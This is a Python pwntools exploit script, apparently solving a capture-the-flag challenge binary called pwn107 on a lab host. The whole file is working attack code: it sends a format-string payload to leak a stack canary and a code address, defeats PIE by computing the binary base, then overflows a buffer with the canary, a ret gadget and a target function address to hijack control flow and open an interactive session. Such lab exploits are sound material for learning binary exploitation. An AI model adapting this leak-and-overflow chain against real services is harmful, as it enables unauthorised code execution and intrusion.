from pwn import *
import warnings

warnings.filterwarnings('ignore')
context.log_level = 'critical'

address = '10.10.80.181'
port = 9007

context.binary = binary = ELF('./pwn107.pwn107')
rop = ROP(binary)


main_offset = 0x992
get_streak_offset = 0x94c
leak_format_payload = '%19$p|%13$p'


overflow = b'A' * 0x18
rbp = b'B' * 8


with remote(address, port) as target:
	target.recvuntil(b'What\'s your last streak? ')
	target.sendline(leak_format_payload.encode())
	target.recvuntil(b'Your current streak: ')

	main_addr, canary = target.recvline().decode().strip().split('|')

	canary = p64(int(canary, 16))
	main_addr = int(main_addr, 16)

	binary.address = main_addr - main_offset
	get_streak_addr = p64(binary.address + get_streak_offset)


	success(f'Canary: {hex(u64(canary))}')
	success(f'get_streak: {hex(u64(get_streak_addr))}')


	payload = overflow
	payload += canary
	payload += rbp
	payload += p64(binary.address + rop.find_gadget(['ret'])[0])
	payload += get_streak_addr


	target.recvuntil('Hi pwner ğŸ‘¾, keep hackingğŸ‘©â€ğŸ’» - We miss you!ğŸ˜¢\n')
	target.sendline(payload)
	target.recvuntil(b'This your last streak back, don\'t do this mistake again\n')
	target.interactive()
